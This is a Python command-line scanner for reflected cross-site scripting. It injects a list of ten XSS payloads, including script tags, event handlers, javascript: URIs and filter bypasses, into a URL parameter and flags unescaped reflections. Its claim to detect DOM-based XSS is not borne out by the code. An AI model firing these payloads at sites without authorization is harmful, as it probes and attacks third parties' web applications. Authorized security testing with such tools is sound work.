#!/usr/bin/env python3
"""
Ethical Exploration - Cross-Site Scripting (XSS) Vulnerability Scanner
License: GNU General Public License v3.0 (GPL-3.0)
Description: Automated scanner for Reflected and DOM-based Cross-Site Scripting (XSS) vulnerabilities.
             Tests contextual reflections across HTML tags, attributes, and JavaScript contexts.
"""

import argparse
import html
import re
import sys
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    import urllib.request
    import urllib.parse
    import urllib.error
    HAS_REQUESTS = False


XSS_PAYLOADS = [
    # Basic script tags
    ("<script>alert('XSS_POC_1')</script>", "Script Tag Injection"),
    ("\"><script>alert('XSS_POC_2')</script>", "Tag Attribute Escape + Script"),
    ("'><script>alert('XSS_POC_3')</script>", "Single-Quote Attribute Escape + Script"),
    
    # Event Handlers
    ("<img src=x onerror=alert('XSS_POC_4')>", "Image Element Event Handler"),
    ("<svg/onload=alert('XSS_POC_5')>", "SVG Element OnLoad Handler"),
    ("\" onfocus=\"alert('XSS_POC_6')\" autofocus=\"", "Input Attribute Event Injection"),
    ("' onfocus='alert('XSS_POC_7')' autofocus='", "Single-Quote Event Injection"),
    
    # Pseudo protocols
    ("javascript:alert('XSS_POC_8')", "JavaScript Pseudo-Protocol (href/src)"),
    
    # Filter bypasses & case manipulation
    ("<ScRiPt>alert('XSS_POC_9')</sCrIpT>", "Mixed Case Bypass"),
    ("<details open ontoggle=alert('XSS_POC_10')>", "Details Tag Ontoggle Handler")
]


def send_xss_probe(url, param_name, payload, method="GET", extra_data=None, timeout=7):
    """Dispatches request with injected XSS payload."""
    req_headers = {"User-Agent": "Mozilla/5.0 (SecurityAudit; XSSScanner/1.0)"}

    data = extra_data.copy() if extra_data else {}
    data[param_name] = payload

    try:
        if HAS_REQUESTS:
            if method.upper() == "POST":
                resp = requests.post(url, data=data, headers=req_headers, timeout=timeout, allow_redirects=True)
            else:
                resp = requests.get(url, params=data, headers=req_headers, timeout=timeout, allow_redirects=True)
            return resp.status_code, resp.text
        else:
            if method.upper() == "POST":
                encoded = urllib.parse.urlencode(data).encode("utf-8")
                req = urllib.request.Request(url, data=encoded, headers=req_headers, method="POST")
            else:
                sep = "&" if "?" in url else "?"
                full_url = f"{url}{sep}{urllib.parse.urlencode(data)}"
                req = urllib.request.Request(full_url, headers=req_headers, method="GET")

            with urllib.request.urlopen(req, timeout=timeout) as response:
                content = response.read().decode("utf-8", errors="ignore")
                return response.status, content
    except Exception as e:
        return None, str(e)


def evaluate_reflection(body, payload):
    """Determines whether payload is reflected in raw unescaped form."""
    if not body:
        return False, "No response body"

    # If payload is reflected verbatim in unencoded HTML
    if payload in body:
        return True, "Raw unencoded reflection in response body"

    # Check if payload was encoded
    encoded_payload = html.escape(payload)
    if encoded_payload in body:
        return False, "Properly HTML entity-encoded (Sanitized)"

    return False, "Not reflected"


def scan_xss(url, param_name="q", method="GET", extra_data=None, threads=5):
    """Coordinates multi-threaded XSS assessment."""
    print("=" * 65)
    print("  Ethical Exploration - Cross-Site Scripting (XSS) Scanner")
    print("=" * 65)
    print(f"[*] Target URL      : {url}")
    print(f"[*] Target Param    : {param_name}")
    print(f"[*] HTTP Method     : {method.upper()}")
    print(f"[*] Payloads to test: {len(XSS_PAYLOADS)}")
    print("-" * 65)

    vulnerabilities = []

    for payload, category in XSS_PAYLOADS:
        status, body = send_xss_probe(url, param_name, payload, method, extra_data)

        if status is not None:
            is_vuln, reason = evaluate_reflection(body, payload)
            if is_vuln:
                vuln_entry = {
                    "category": category,
                    "payload": payload,
                    "status": status,
                    "evidence": reason
                }
                vulnerabilities.append(vuln_entry)
                print(f"[!] [VULNERABILITY] {category} Triggered!")
                print(f"    Payload : {payload}")
                print(f"    Status  : HTTP {status} | Evidence: {reason}")
            else:
                print(f"[-] Safe: {category:<35} -> {reason}")
        else:
            print(f"[!] Connection failed for payload: {payload}")

    print("-" * 65)
    print("ASSESSMENT SUMMARY:")
    if vulnerabilities:
        print(f"[+] Identified {len(vulnerabilities)} vulnerable vector(s) on parameter '{param_name}'!")
    else:
        print(f"[-] No raw unescaped reflections discovered on parameter '{param_name}'.")
    print("=" * 65)

    return vulnerabilities


def main():
    parser = argparse.ArgumentParser(
        description="Ethical Exploration - Cross-Site Scripting (XSS) Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""Examples:
  python3 XSSScanner.py -u https://example.com/search -p query -m GET
  python3 XSSScanner.py -u https://example.com/comment -p message -m POST
"""
    )
    parser.add_argument("-u", "--url", default="https://example.com/search", help="Target URL endpoint")
    parser.add_argument("-p", "--param", default="query", help="Target parameter to fuzz with XSS vectors")
    parser.add_argument("-m", "--method", default="GET", choices=["GET", "POST"], help="HTTP Method (default: GET)")

    args = parser.parse_args()

    scan_xss(
        url=args.url,
        param_name=args.param,
        method=args.method
    )


if __name__ == "__main__":
    main()
